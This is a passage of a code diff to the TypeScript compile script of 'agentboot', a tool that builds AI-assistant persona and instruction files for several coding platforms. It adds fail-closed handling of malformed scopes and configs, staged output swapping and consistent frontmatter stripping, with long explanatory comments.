@@ -36,8 +36,8 @@ import {
   type DomainManifest,
   type PluginManifest,
   type ResolvedTrait,
-  resolveConfigPath,
-  loadConfig,
+  resolveHubConfigOrExit,
+  loadConfigOrExit,
   stripJsoncComments,
   flattenNodes,
   groupsToNodes,
@@ -45,9 +45,54 @@ import {
   DEFAULT_WEIGHT,
   WEIGHT_MAP,
   agentbootNpxSpec,
+  DEFAULT_OUTPUT_FORMATS,
+  VALID_OUTPUT_FORMATS,
+  PLATFORM_REQUIRES,
 } from "./lib/config.js";
-import { parseFrontmatter, resolveCompositionType } from "./lib/frontmatter.js";
+import { parseFrontmatter, resolveCompositionType, normalizeForFrontmatter } from "./lib/frontmatter.js";
 import { buildTelemetryJsonSchema, TELEMETRY_SCHEMA_VERSION } from "./lib/telemetry-schema.js";
+import { PLATFORM_ENFORCEMENT, CAPABILITY_SUPPORT, effectiveEmitters, type CapabilityContext } from "./lib/conformance.js";
+import {
+  inspectArtifact, unenforceableFormats, capabilityViolations,
+  countNarrowlyScopedInstructions, countScopedGotchas, countPersonaScopeControls,
+} from "./lib/guardrail-scan.js";
+import { HUB_EXCEPTIONS_FILE, loadExceptionsFile, validateExceptions, type PolicyException } from "./lib/exceptions.js";
+import { dangerousHookFindings, unscannableHookEvents, hookGroupsFor } from "./lib/hook-safety.js";
+import { inertPermissionRules } from "./lib/permission-rules.js";
+import { hookInputCapPrelude, hookJsonExtract } from "./lib/hook-prelude.js";
+import { mergeManagedFragments, readManagedFragment, type MergeConflict, type MergeResult, type MalformedHook, type MalformedValue } from "./lib/managed-merge.js";
+import {
+  inspectScope, degradedFormats, scopeViolations, scopePreamble, readScopeGlobs,
+  APPLY_TO_PROJECTION, rewriteFrontmatterKeyBlock, type ScopedArtifact,
+} from "./lib/scope-projection.js";
+import { scopeBearingInstructionDirs } from "./lib/scope-layout.js";
+import { diffTrees, inventoryTree } from "./lib/prune.js";
+import { resolveWithin, PathEscapeError } from "./lib/path-containment.js";
+import {
+  computeConfigDigest, computeSourceDigest, resolveDomainRoots, writeDistStamp, markDistBuildFailed,
+} from "./lib/dist-stamp.js";
+
+
+/**
+ * V3: strip a leading frontmatter block from an artifact BODY.
+ *
+ * The twenty hand-written frontmatter-stripping regexes (`^---` … `---`, LF only)
+ * did not match
+ * CRLF frontmatter, so a CRLF-authored instruction shipped its raw YAML
+ * frontmatter inside the compiled body — Cursor received TWO frontmatter blocks,
+ * the generated one followed by `applyTo:` / `scope-unsupported:` rendered as
+ * instruction text. C1 fixed the gate for that input class and left the
+ * emitters. One tolerant stripper, matching frontmatterBlock's own
+ * normalization.
+ */
+function stripFrontmatterBody(content: string): string {
+  return normalizeForFrontmatter(content).replace(/^---\n[\s\S]*?\n---\n*/, "");
+}
+
+/** Escape a value for interpolation into a double-quoted YAML scalar. */
+function yamlDoubleQuoted(value: string): string {
+  return value.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+}
 
 // ---------------------------------------------------------------------------
 // Paths
@@ -75,6 +120,8 @@ interface TraitContent {
   name: string;
   content: string;
   filePath: string;
+  /** Verbatim file content including frontmatter — for copy-out paths. */
+  raw: string;
 }
 
 interface CompileResult {
@@ -82,6 +129,18 @@ interface CompileResult {
   platforms: string[];
   traitsInjected: string[];
   scope: "core" | "group" | "team";
+  /**
+   * NF3-3: size of the COMPOSED persona prompt (SKILL.md body + injected
+   * traits), in characters, measured where it is composed.
+   *
+   * The token-budget gate used to measure `dist/skill/core/<persona>/SKILL.md`
+   * behind an `fs.existsSync`, which made `output.tokenBudget.failAt` — a
+   * build-failing gate the operator configures — silently inert on any hub that
+   * does not build the `skill` format. Prompt size is a property of the composed
+   * persona, not of one platform's wrapper, so there is no platform whose
+   * absence can switch the budget off.
+   */
+  composedChars: number;
 }
 
 // ---------------------------------------------------------------------------
@@ -93,12 +152,284 @@ function fatal(msg: string): never {
   process.exit(1);
 }
 
+
+/**
+ * NF2-3: a path-scope key that is present but unparseable stops the build.
+ *
+ * "I could not read the scope" and "there is no scope" are different facts, and
+ * conflating them delivers a narrowly-scoped rule as global — inversion, which
+ * this codebase already established is strictly worse than omission. One sweep
+ * over the sources rather than a check inside each of the seven emitters,
+ * because per-emitter checks are exactly how the seven hand-rolled parsers
+ * drifted apart.
+ */
+/**
+ * Where a configured domain lives on disk.
+ *
+ * NEW-1: this expression used to exist only inside compileDomains(), so the
+ * fail-closed scope gate could not enumerate domains without re-deriving it —
+ * and re-deriving is how two lists that must agree drift. One resolver, two
+ * callers.
+ */
+function resolveDomainPath(
+  domainRef: NonNullable<AgentBootConfig["domains"]>[number],
+  configDir: string,
+): string {
+  return typeof domainRef === "string"
+    ? path.resolve(configDir, domainRef)
+    : path.resolve(configDir, domainRef.path ?? `./domains/${domainRef.name}`);
+}
+
+/**
+ * Every directory whose `.md` files carry a path-scope key an emitter reads.
+ *
+ * NEW-1: the NF2-3 gate enumerated exactly three directories — the package and
+ * core instruction dirs and core/gotchas — and omitted `domains/*&#47;instructions`,
+ * which compileDomains() pushes through the SAME emitters. So a malformed
+ * `applyTo:` in a domain escaped both this gate and the F-6 scope-degradation
+ * gate (F-6 keys off globs.length, which is empty for a malformed value), and
+ * the inversion NF2-3 closed was fully live one tier over. Measured on a
+ * scratch hub: an unterminated flow sequence in domains/fin/instructions gave
+ * build=0, validate=0 ("All 12 checks passed"), audit=0, conformance=0, and
+ * shipped the broken frontmatter verbatim to dist/copilot — while the SAME
+ * BYTES in core/instructions exited 1. Same file, opposite verdict, decided
+ * only by which directory it sat in.
+ *
+ * This is the c836c46 shape ("the whole GROUP tier was invisible to the gate
+ * that exists to see it") one directory over, so the fix is the enumeration,
+ * not another entry in a hand-kept list.
+ *
+ * Domain `gotchas/` is deliberately absent: compileGotchas() is only ever
+ * called for core/gotchas, so a domain gotcha reaches no emitter. Gating a file
+ * that ships nowhere would be a false refusal, and a gate that refuses on the
+ * wrong evidence gets disabled. If domain gotchas are ever compiled, they get
+ * added here and tests/scope-fail-closed.test.ts's parametrised list is what
+ * fails until they are.
+ */
+function scopeBearingSourceGroups(
+  config: AgentBootConfig,
+  configDir: string,
+  packageInstructionsDir: string,
+  coreInstructionsDir: string,
+  coreDir: string,
+): { dir: string; key: "applyTo" | "paths"; enabled: string[] | undefined }[] {
+  const groups: { dir: string; key: "applyTo" | "paths"; enabled: string[] | undefined }[] = [
+    { dir: packageInstructionsDir, key: "applyTo", enabled: config.instructions?.enabled },
+    { dir: coreInstructionsDir, key: "applyTo", enabled: config.instructions?.enabled },
+    { dir: path.join(coreDir, "gotchas"), key: "paths", enabled: undefined },
+  ];
+  for (const domainRef of config.domains ?? []) {
+    // `enabled: undefined` mirrors compileDomains(), which passes undefined —
+    // every instruction in a configured domain is compiled.
+    groups.push({
+      dir: path.join(resolveDomainPath(domainRef, configDir), "instructions"),
+      key: "applyTo",
+      enabled: undefined,
+    });
+  }
+  return groups;
+}
+
+function assertScopeKeysParse(
+  groups: { dir: string; key: "applyTo" | "paths"; enabled: string[] | undefined }[],
+): void {
+  const bad: string[] = [];
+  for (const { dir, key, enabled } of groups) {
+    if (!fs.existsSync(dir)) continue;
+    for (const f of fs.readdirSync(dir)) {
+      if (!f.endsWith(".md")) continue;
+      const name = path.basename(f, ".md");
+      if (enabled && !enabled.includes(name)) continue;
+      const content = fs.readFileSync(path.join(dir, f), "utf-8");
+      const { malformed } = readScopeGlobs(content, key);
+      if (malformed) bad.push(`  ${path.join(dir, f)}\n      ${key}: ${malformed}`);
+    }
+  }
+  if (bad.length > 0) {
+    fatal(
+      `${bad.length} artifact(s) have an unreadable path scope:\n${bad.join("\n")}\n` +
+        `  An unreadable scope cannot be delivered as "no scope" — that would deliver a\n` +
+        `  narrow rule as always-on, every file. Fix the YAML, or write applyTo: "**" if\n` +
+        `  the rule really is universal.`
+    );
+  }
+}
+
 function log(msg: string): void {
   console.log(msg);
 }
 
 function ensureDir(dirPath: string): void {
   fs.mkdirSync(dirPath, { recursive: true });
+}
+
+// ---------------------------------------------------------------------------
+// dist/ staging + prune (F-1)
+// ---------------------------------------------------------------------------
+
+/**
+ * The staging directory for the build currently in flight, or null when there
+ * is nothing to clean up. Registered on `process.on("exit")` so a crash, a
+ * `fatal()`, or a mid-build `process.exit(1)` leaves the previous `dist/`
+ * byte-identical instead of half-overwritten.
+ */
+let stagingDistPath: string | null = null;
+
+/**
+ * N1: everything needed to INVALIDATE the previous `dist/` when this build does
+ * not finish. Armed as soon as the config is loaded; cleared by the successful
+ * swap. While it is non-null, a non-zero exit means "the tree at finalDistPath
+ * is now known-stale" and the exit hook records that ON DISK.
+ *
+ * Without this, staging's (correct) blast-radius behaviour — leave the previous
+ * dist/ byte-identical — is indistinguishable, to every downstream consumer,
+ * from a successful build that produced no changes.
+ */
+let distInvalidationContext:
+  | { finalDistPath: string; configDigest: string; outputFormats: string[]; version: string }
+  | null = null;
+
+process.on("exit", (code) => {
+  if (stagingDistPath && fs.existsSync(stagingDistPath)) {
+    try {
+      fs.rmSync(stagingDistPath, { recursive: true, force: true });
+    } catch {
+      /* best effort — never mask the real exit code */
+    }
+  }
+  // A build that did not reach the swap leaves a dist/ that no longer
+  // corresponds to the config on disk. Say so. Silence is not success.
+  if (code !== 0 && distInvalidationContext) {
+    const ctx = distInvalidationContext;
+    markDistBuildFailed(
+      ctx.finalDistPath,
+      `build exited ${code} before the staged tree was swapped into place`,
+      ctx.configDigest,
+      ctx.outputFormats,
+      ctx.version,
+    );
+  }
+});
+
+/** Version of the installed agentboot package, for the dist stamp. */
+function packageVersion(): string {
+  try {
+    const pkgPath = path.join(ROOT, "package.json");
+    const pkg = JSON.parse(fs.readFileSync(pkgPath, "utf-8")) as { version?: string };
+    return pkg.version ?? "0.0.0";
+  } catch {
+    return "0.0.0";
+  }
+}
+
+/**
+ * Refuse to point the build (which now DELETES this tree on every run) at
+ * anything that is not plainly a generated output directory.
+ */
+function assertSafeDistTarget(finalDistPath: string, configDir: string): void {
+  let stat: fs.Stats | undefined;
+  try {
+    stat = fs.lstatSync(finalDistPath);
+  } catch {
+    stat = undefined;
+  }
+  if (stat?.isSymbolicLink()) {
+    fatal(
+      `output.distPath is a symlink: ${finalDistPath}\n  The build replaces this directory wholesale; refusing to follow a symlink.`,
+    );
+  }
+  const resolvedConfigDir = path.resolve(configDir);
+  if (path.resolve(finalDistPath) === resolvedConfigDir) {
+    fatal(`output.distPath resolves to the hub root: ${finalDistPath}`);
+  }
+  const rel = path.relative(resolvedConfigDir, path.resolve(finalDistPath));
+  if (rel.startsWith("..") || path.isAbsolute(rel)) {
+    fatal(
+      `output.distPath resolves outside the hub: ${finalDistPath}\n  The build replaces this directory wholesale; it must live under ${resolvedConfigDir}.`,
+    );
+  }
+}
+
+/** Recursive copy used only as the EXDEV fallback for the staging swap. */
+function copyTree(src: string, dest: string): void {
+  fs.mkdirSync(dest, { recursive: true });
+  for (const entry of fs.readdirSync(src, { withFileTypes: true })) {
+    const from = path.join(src, entry.name);
+    const to = path.join(dest, entry.name);
+    if (entry.isDirectory()) copyTree(from, to);
+    else fs.copyFileSync(from, to);
+  }
+}
+
+/**
+ * Swap the staging tree into place and report exactly what stopped being
+ * produced. Per "Silence Is Not Success" the zero case is printed too — "no
+ * artifact went stale" and "pruning never ran" must not look identical.
+ */
+function swapDistAndReport(stagingPath: string, finalPath: string): void {
+  const before = inventoryTree(finalPath);
+  const after = inventoryTree(stagingPath);
+  const { removed, retiredTrees } = diffTrees(before, after);
+
+  if (fs.existsSync(finalPath)) {
+    fs.rmSync(finalPath, { recursive: true, force: true });
+  }
+  try {
+    fs.renameSync(stagingPath, finalPath);
+  } catch {
+    // Cross-device or a Windows rename-over — fall back to copy + remove.
+    // Never fall back to "keep the old tree and exit 0": that is the silent
+    // skip this whole change exists to eliminate.
+    try {
+      copyTree(stagingPath, finalPath);
+      fs.rmSync(stagingPath, { recursive: true, force: true });
+    } catch (err: unknown) {
+      fatal(
+        `Could not move the staged build into place.\n` +
+          `  Staged output is at: ${stagingPath}\n` +
+          `  Target was:          ${finalPath}\n` +
+          `  Cause: ${err instanceof Error ? err.message : String(err)}`,
+      );
+    }
+  }
+  stagingDistPath = null;
+
+  if (removed.length === 0 && retiredTrees.length === 0) {
+    log(chalk.gray(`  dist/ pruned: 0 stale artifact(s), 0 retired platform tree(s)`));
+    return;
+  }
+
+  if (removed.length > 0) {
+    log(chalk.yellow(`  Pruned ${removed.length} stale artifact(s) from dist/:`));
+    for (const p of removed.slice(0, 20)) {
+      log(chalk.gray(`    − dist/${p}`));
+    }
+    if (removed.length > 20) {
+      log(chalk.gray(`    … and ${removed.length - 20} more`));
+    }
+  }
+  if (retiredTrees.length > 0) {
+    log(
+      chalk.yellow(
+        `  Pruned ${retiredTrees.length} retired platform tree(s): ${retiredTrees.join(", ")}`,
+      ),
+    );
+  }
+}
+
+/**
+ * F-6: place a block AFTER the leading frontmatter (and therefore after the
+ * provenance header withProvenance inserts there), so frontmatter-first formats
+ * keep opening with the YAML delimiter.
+ */
+function insertAfterFrontmatter(text: string, block: string): string {
+  // V3: normalize first. Against CRLF content this regex matched nothing, so
+  // the Scope preamble was prepended ABOVE the frontmatter and the raw YAML
+  // then rendered as body text underneath it.
+  const normalized = normalizeForFrontmatter(text);
+  const m = normalized.match(/^---\n[\s\S]*?\n---\n*/);
+  if (!m) return `${block}\n${normalized}`;
+  return `${m[0]}${block}\n${normalized.slice(m[0].length)}`;
 }
 
 function provenanceHeader(sourceFile: string, config: AgentBootConfig): string {
@@ -164,11 +495,20 @@ function loadTraits(
     }
 
     const filePath = path.join(coreTraitsDir, file);
-    const content = fs.readFileSync(filePath, "utf-8");
+    const raw = fs.readFileSync(filePath, "utf-8");
+
+    // decision-0005: traits may now carry identity frontmatter (id/slug/hash).
+    // Strip it HERE, once, rather than at each consumer — two consumers
+    // (selectTraitTier and the persona injector) did not strip, so per-site
+    // stripping would have leaked `id:`/`hash:` into every compiled persona.
+    // `content` is the composable body; `raw` keeps the file verbatim for the
+    // copy-out paths that reproduce the source artifact.
+    const content = stripFrontmatterBody(raw);
 
     traits.set(traitName, {
       name: traitName,
       content: content.trim(),
+      raw: raw.trim(),
       filePath,
     });
   }
@@ -291,18 +631,58 @@ function compileLexiconBlock(entries: LexiconEntry[]): string {
 // Persona config loading
 // ---------------------------------------------------------------------------
 
+/**
+ * NF3-7: an unreadable persona policy is FATAL, not a warning.
+ *
+ * This used to catch the parse error, print a yellow `⚠ Failed to parse
+ * persona.config.json in <dir>`, and return null. Every downstream reader is
+ * `personaConfig?.disallowedTools`, `personaConfig?.tools`, `pc?.hooks` — all
+ * no-ops on null — so the persona then compiled and SHIPPED with its entire
+ * config silently absent, including its tool restrictions, and the build exited
+ * 0. "I could not read the policy" resolved to "there is no policy", which is
+ * the fail-open-on-unknown-data class this branch keeps producing.
+ *
+ * The asymmetry that makes this the right call: a persona with NO
+ * persona.config.json is a legitimate, common state and still returns null. A
+ * persona with a config file that cannot be parsed is an operator who wrote a
+ * policy and got none of it, and the only two outcomes are "stop" or "ship the
+ * agent unrestricted". Every other unreadable-policy path on this branch stops.
+ *
+ * Fatal here rather than at the capability gate on purpose: the gate reasons
+ * about which PLATFORM can carry a control, and cannot distinguish "this
+ * persona declares nothing" from "this persona's declaration is unreadable".
+ * countPersonaScopeControls() fails closed for the doctor path, which reports
+ * rather than refuses; the build refuses outright.
+ */
 function loadPersonaConfig(personaDir: string): PersonaConfig | null {
   const configPath = path.join(personaDir, "persona.config.json");
   if (!fs.existsSync(configPath)) {
     return null;
   }
   const raw = fs.readFileSync(configPath, "utf-8");
+  let parsed: unknown;
   try {
-    return JSON.parse(stripJsoncComments(raw)) as PersonaConfig;
-  } catch {
-    log(chalk.yellow(`  ⚠ Failed to parse persona.config.json in ${personaDir}`));
-    return null;
+    parsed = JSON.parse(stripJsoncComments(raw));
+  } catch (err: unknown) {
+    fatal(
+      `${path.relative(process.cwd(), configPath)} is not readable JSON:\n` +
+        `      ${err instanceof Error ? err.message : String(err)}\n` +
+        `  This file carries the persona's tool restrictions (disallowedTools, tools) and\n` +
+        `  its hooks. Compiling past it would ship the persona with NO restrictions, which\n` +
+        `  is the opposite of what the file says. Fix the JSON, or delete the file if the\n` +
+        `  persona is meant to have no config.`
+    );
   }
+  // Parsing is not enough: 42, a bare string, null and [] all parse, and every
+  // field read off them is undefined — the same silent no-policy outcome by
+  // another route.
+  if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) {
+    fatal(
+      `${path.relative(process.cwd(), configPath)} is not a JSON object.\n` +
+        `  Every restriction in it would read as absent, shipping the persona unrestricted.`
+    );
+  }
+  return parsed as PersonaConfig;
 }
 
 // ---------------------------------------------------------------------------
@@ -544,6 +924,41 @@ function injectTraits(
 // Platform-specific output builders
 // ---------------------------------------------------------------------------
 
+/**
+ * Identity fields decision-0005 stamps on source artifacts.
+ *
+ * The Agent Skills ALLOW-list deliberately does not live here. `skills-ref` is
+ * the authority and runs as a merge gate; `tests/skill-spec-frontmatter.test.ts`
+ * carries the local copy for fast feedback. A third copy in the emitter would be
+ * a list that must agree with two others — the shape that has produced eight
+ * reader/writer instances on this branch. The emitter's job is narrower: move
+ * what it stamps, and let the gate judge the result.
+ */
+const IDENTITY_KEYS = ["id", "slug", "hash"] as const;
+
+/**
+ * Emit the cross-platform `dist/skill/` SKILL.md.
+ *
+ * Q-CI-1: artifact identity has to MOVE, not travel. decision-0005 stamps `id`,
+ * `slug` and `hash` onto source personas, and this emitter passed the composed
+ * content straight through — so all three landed at the top level of every
+ * emitted SKILL.md, where the Agent Skills spec forbids unknown keys:
+ *
+ *   Validation failed for dist/skill/core/ai-security-reviewer/:
+ *     - Unexpected fields in frontmatter: hash, id, slug.
+ *
+ * Both required CI legs failed on it, on the branch's first CI run ever. The
+ * local suite could not have caught this: `skills-ref` is pinned and invoked
+ * only by the workflow, so the one authority on this file format does not
+ * execute on a developer machine. That is the argument for E4 in a sentence —
+ * a build can be green everywhere it is cheap to look.
+ *
+ * The identity is NOT dropped. `metadata` is an allowed key, so the stamps move
+ * under it: the emitted artifact stays traceable to its source, which is the
+ * whole point of the VIN, and the spec is satisfied. Dropping them would have
+ * been the easier fix and would have quietly cost the traceability the identity
+ * work exists to provide.
+ */
 function buildSkillOutput(
   _personaName: string,
   _personaConfig: PersonaConfig | null,
@@ -551,7 +966,43 @@ function buildSkillOutput(
   config: AgentBootConfig,
   skillPath: string
 ): string {
-  return withProvenance(composedContent, skillPath, config);
+  return withProvenance(nestIdentityUnderMetadata(composedContent), skillPath, config);
+}
+
+/**
+ * Move top-level identity keys into a `metadata:` block, preserving every other
+ * key and the body byte-for-byte.
+ *
+ * Returns the input unchanged when there is no frontmatter or no identity to
+ * move, so this is a no-op on an unstamped corpus rather than a reformatter.
+ */
+export function nestIdentityUnderMetadata(content: string): string {
+  const normalized = normalizeForFrontmatter(content);
+  const m = /^---\n([\s\S]*?)\n---\n?/.exec(normalized);
+  if (!m) return content;
+
+  const lines = (m[1] ?? "").split("\n");
+  const moved: Array<[string, string]> = [];
+  const kept: string[] = [];
+
+  for (const line of lines) {
+    const kv = /^([A-Za-z0-9_-]+):\s*(.*)$/.exec(line);
+    if (kv && (IDENTITY_KEYS as readonly string[]).includes(kv[1]!)) {
+      moved.push([kv[1]!, kv[2]!]);
+      continue;
+    }
+    kept.push(line);
+  }
+  if (moved.length === 0) return content;
+
+  // An existing `metadata:` block would need merging rather than appending, and
+  // getting that silently wrong is worse than refusing: leave it alone and let
+  // the CI gate speak. No persona in this corpus has one.
+  if (kept.some((l) => /^metadata:/.test(l))) return content;
+
+  const block = ["metadata:", ...moved.map(([k, v]) => `  ${k}: ${v}`)];
+  const rebuilt = ["---", ...kept.filter((l) => l.trim() !== ""), ...block, "---"].join("\n");
+  return rebuilt + "\n" + normalized.slice(m[0].length);
 }
 
 /**
@@ -591,7 +1042,7 @@ function buildClaudeOutput(
   frontmatterLines.push("---", "");
 
   // Strip any existing frontmatter from composed content (it's SKILL.md format)
-  const withoutFrontmatter = composedContent.replace(/^---\n[\s\S]*?\n---\n*/, "");
+  const withoutFrontmatter = stripFrontmatterBody(composedContent);
 
   return {
     content: `${frontmatterLines.join("\n")}\n${withoutFrontmatter}`,
@@ -610,8 +1061,12 @@ function buildCopilotOutput(
   const description = personaConfig?.description
     ? `${personaConfig.description}\n\n---\n\n`
     : "";
-  // Strip HTML comments for Copilot output.
-  const stripped = composedContent.replace(/<!--[\s\S]*?-->/g, "").trim();
+  // L51: strip HTML comments AND the composed body's own frontmatter. This
+  // emitter inlines a persona SKILL.md into prose, and it was the only persona
+  // emitter that never stripped — so `name:/description:/id:/slug:/hash:` shipped
+  // to Copilot as instruction body text under the generated header. Same
+  // stripper as every sibling emitter; not a second regex.
+  const stripped = stripFrontmatterBody(composedContent.replace(/<!--[\s\S]*?-->/g, "")).trim();
   return `${provenanceHeader(skillPath, config)}${header}${description}${stripped}\n`;
 }
 
@@ -638,8 +1093,17 @@ function buildCursorRule(
   }
   lines.push(`alwaysApply: ${options?.alwaysApply ?? false}`);
   lines.push("---", "");
-  // Strip HTML comments and trait markers for clean Cursor output
-  const stripped = content.replace(/<!--[\s\S]*?-->/g, "").trim();
+  // Strip HTML comments and trait markers for clean Cursor output.
+  //
+  // L51: the body's own frontmatter is stripped HERE rather than at each call
+  // site. Two of the three callers (instructions, gotchas) already stripped;
+  // the persona caller did not, so all five `.mdc` personas shipped TWO
+  // frontmatter blocks — the generated one, then the raw SKILL.md block as
+  // instruction text. Cursor reads only the first, so the second is prose.
+  // Stripping inside the builder makes the guarantee a property of the emitter
+  // instead of a habit the next caller has to remember; it is a no-op on the
+  // callers that already stripped.
+  const stripped = stripFrontmatterBody(content.replace(/<!--[\s\S]*?-->/g, "")).trim();
   lines.push(stripped);
   return lines.join("\n") + "\n";
 }
@@ -659,7 +1123,7 @@ function buildCopilotAgent(
   const model = personaConfig?.model ?? "claude-sonnet-4-6";
   const safeName = name.replace(/"/g, '\\"');
   const safeDescription = description.replace(/"/g, '\\"');
-  const stripped = composedContent.replace(/<!--[\s\S]*?-->/g, "").replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
+  const stripped = stripFrontmatterBody(composedContent.replace(/<!--[\s\S]*?-->/g, "")).trim();
   const frontmatter = [
     "---",
     `name: "AgentBoot ${safeName}"`,
@@ -685,10 +1149,7 @@ function buildWindsurfRules(
 ): string {
   const header = `# ${personaConfig?.name ?? personaName}\n# ${personaConfig?.description ?? ""}\n\n`;
   // Strip HTML comments and frontmatter for clean Windsurf output
-  const stripped = composedContent
-    .replace(/<!--[\s\S]*?-->/g, "")
-    .replace(/^---\n[\s\S]*?\n---\n*/, "")
-    .trim();
+  const stripped = stripFrontmatterBody(composedContent.replace(/<!--[\s\S]*?-->/g, "")).trim();
   return `${header}${stripped}\n`;
 }
 
@@ -707,10 +1168,7 @@ function buildGeminiOutput(
     ? `${personaConfig.description}\n\n---\n\n`
     : "";
   // Strip HTML comments for Gemini output
-  const stripped = composedContent
-    .replace(/<!--[\s\S]*?-->/g, "")
-    .replace(/^---\n[\s\S]*?\n---\n*/, "")
-    .trim();
+  const stripped = stripFrontmatterBody(composedContent.replace(/<!--[\s\S]*?-->/g, "")).trim();
   return `${header}${description}${stripped}\n`;
 }
 
@@ -733,7 +1191,7 @@ function compilePersona(
 
   if (!fs.existsSync(skillPath)) {
     log(chalk.yellow(`  ⚠ [${personaName}] No SKILL.md found — skipping`));
-    return { persona: personaName, platforms: [], traitsInjected: [], scope };
+    return { persona: personaName, platforms: [], traitsInjected: [], scope, composedChars: 0 };
   }
 
   const personaConfig = loadPersonaConfig(personaDir);
@@ -768,9 +1226,10 @@ function compilePersona(
     personaName
   );
 
-  // "agents" (AGENTS.md) is a first-class official output — the fallback must
-  // agree with the install/export defaults, which always include it.
-  const outputFormats = config.personas?.outputFormats ?? ["skill", "claude", "copilot", "agents"];
+  // A5: one default, imported. This site used to add "agents" to the fallback
+  // while main() did not, so a config omitting personas.outputFormats compiled
+  // per-persona output for a platform the build never announced or pruned.
+  const outputFormats = config.personas?.outputFormats ?? [...DEFAULT_OUTPUT_FORMATS];
   const platforms: string[] = [];
 
   // Write to dist/{platform}/{scopePath}/{persona}/ (or skills/{name}/ for claude)
@@ -818,7 +1277,7 @@ function compilePersona(
       .replace(/\0/g, "")       // null bytes → remove
       .replace(/[\x00-\x08\x0b\x0c\x0e-\x1f]/g, "") // other control chars → remove
       .replace(/---/g, "\\-\\-\\-"); // prevent YAML document markers
-    const withoutFrontmatter = composed.replace(/^---\n[\s\S]*?\n---\n*/, "");
+    const withoutFrontmatter = stripFrontmatterBody(composed);
     const agentFrontmatter: string[] = [
       "---",
       `name: "${personaName}"`,
@@ -917,8 +1376,7 @@ function compilePersona(
     const jetbrainsDir = path.join(distPath, "jetbrains", scopePath);
     ensureDir(jetbrainsDir);
     // Build content: strip frontmatter and HTML comments for clean markdown
-    const cleanContent = composed
-      .replace(/^---\n[\s\S]*?\n---\n*/, "")
+    const cleanContent = stripFrontmatterBody(composed)
       .replace(/<!--[\s\S]*?-->/g, "")
       .trim();
     const personaHeader = `## ${personaConfig?.name ?? personaName}\n\n`;
@@ -936,7 +1394,7 @@ function compilePersona(
     if (!platforms.includes("jetbrains")) platforms.push("jetbrains");
   }
 
-  return { persona: personaName, platforms, traitsInjected: injected, scope };
+  return { persona: personaName, platforms, traitsInjected: injected, scope, composedChars: composed.length };
 }
 
 // ---------------------------------------------------------------------------
@@ -949,7 +1407,20 @@ function compileInstructions(
   distPath: string,
   scopePath: string,
   config: AgentBootConfig,
-  outputFormats: string[]
+  outputFormats: string[],
+  /**
+   * F-6: out-param collecting every enabled instruction's path scope, keyed
+   * `<scope>/<name>` so the hub copy legitimately overwrites the package copy.
+   *
+   * C4: REQUIRED, not optional. As `scopeSeen?:` it was the most dangerous
+   * unpinned line on the branch — dropping the argument at the compileDomains
+   * call site silently reinstated F-6 for every `domains/*` instruction (rules
+   * authored narrow, delivered always-on to targets that cannot scope) with a
+   * fully green suite and a fully green tsc. Making it required means the
+   * compiler refuses the omission; tests/scope-projection.test.ts C4-1 covers
+   * the case where someone passes a throwaway map instead.
+   */
+  scopeSeen: Map<string, ScopedArtifact>,
 ): void {
   if (!fs.existsSync(instructionsDir)) {
     return;
@@ -957,6 +1428,20 @@ function compileInstructions(
 
   const files = fs.readdirSync(instructionsDir).filter((f) => f.endsWith(".md"));
   const provenanceEnabled = config.output?.provenanceHeaders !== false;
+
+  // Collected BEFORE the platform loop, and independently of it: the loop skips
+  // agents/plugin/gemini/codex, so a build targeting only the unsupported tier
+  // would otherwise leave the gate blind on exactly the case it exists for.
+  for (const file of files) {
+    const name = path.basename(file, ".md");
+    if (enabledInstructions && !enabledInstructions.includes(name)) continue;
+    const srcPath = path.join(instructionsDir, file);
+    const sc = inspectScope(fs.readFileSync(srcPath, "utf-8"));
+    scopeSeen.set(`${scopePath}/${name}`, {
+      name, file: srcPath, scopePath: sc.raw ?? "", globs: sc.globs,
+      acknowledgedUnscoped: sc.acknowledgedUnscoped,
+    });
+  }
 
   for (const platform of outputFormats) {
     if (platform === "agents" || platform === "plugin" || platform === "gemini" || platform === "codex") continue; // handled separately; gemini/codex inline instructions in their primary config file
@@ -971,8 +1456,18 @@ function compileInstructions(
 
       // Phase 11 B2: Cursor instructions — use .mdc format with alwaysApply
       if (platform === "cursor") {
-        const strippedContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
-        const cursorContent = buildCursorRule(name, strippedContent, { alwaysApply: true });
+        const strippedContent = stripFrontmatterBody(content).trim();
+        // F-6: `alwaysApply: true` was HARDCODED here, so `applyTo: "src/api/**"`
+        // shipped as always-on, every file — the opposite of what was authored.
+        // buildCursorRule already accepted { globs, alwaysApply }; only the
+        // caller was missing. `alwaysApply: globs.length === 0` preserves the
+        // mutual-exclusivity invariant (globs XOR alwaysApply) asserted in
+        // tests/pipeline.test.ts.
+        const { globs } = inspectScope(content);
+        const cursorContent = buildCursorRule(name, strippedContent, {
+          globs: globs.length > 0 ? globs : undefined,
+          alwaysApply: globs.length === 0,
+        });
         const outDir = path.join(distPath, platform, scopePath, "rules");
         ensureDir(outDir);
         fs.writeFileSync(path.join(outDir, `${name}.mdc`), cursorContent, "utf-8");
@@ -982,27 +1477,33 @@ function compileInstructions(
       // Phase 11 A1e: Windsurf instructions — write to .windsurf/rules/ with trigger: always_on
       // Also append to legacy .windsurfrules for backward compat
       if (platform === "windsurf") {
-        const strippedContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").replace(/<!--[\s\S]*?-->/g, "").trim();
+        const strippedContent = stripFrontmatterBody(content).replace(/<!--[\s\S]*?-->/g, "").trim();
         // Modern format: .windsurf/rules/*.md with trigger frontmatter
         const windsurfRulesDir = path.join(distPath, "windsurf", scopePath, ".windsurf", "rules");
         ensureDir(windsurfRulesDir);
-        const windsurfModern = [
-          "---",
-          "trigger: always_on",
-          `description: "${name}"`,
-          "---",
-          "",
-          strippedContent,
-          "",
-        ].join("\n");
-        fs.writeFileSync(path.join(windsurfRulesDir, `${name}.md`), windsurfModern, "utf-8");
-        // Legacy format: append to .windsurfrules
+        // F-6: `trigger: always_on` was a hardcoded string literal. Same shape
+        // compileGotchas already emits for this platform, ten lines away.
+        const { globs } = inspectScope(content);
+        const windsurfLines = ["---", `trigger: ${globs.length > 0 ? "glob" : "always_on"}`];
+        if (globs.length > 0) {
+          windsurfLines.push("globs:");
+          for (const g of globs) windsurfLines.push(`  - "${g}"`);
+        }
+        windsurfLines.push(`description: "${name}"`, "---", "", strippedContent, "");
+        fs.writeFileSync(path.join(windsurfRulesDir, `${name}.md`), windsurfLines.join("\n"), "utf-8");
